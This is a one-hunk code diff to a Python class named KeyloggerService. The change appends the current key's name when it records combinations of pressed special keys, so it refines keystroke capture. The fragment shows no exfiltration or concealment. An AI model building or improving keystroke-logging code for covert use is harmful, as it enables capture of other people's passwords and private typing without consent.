@@ -29,6 +29,7 @@ class KeyloggerService:
         if len(key.name) > 1:
             key_array = [value.name for k,value in keyboard._pressed_events.items()]
             string = "".join(key_array)
+            string += key.name
             key_name = "~" + string + "~"
             return key_name
         else:
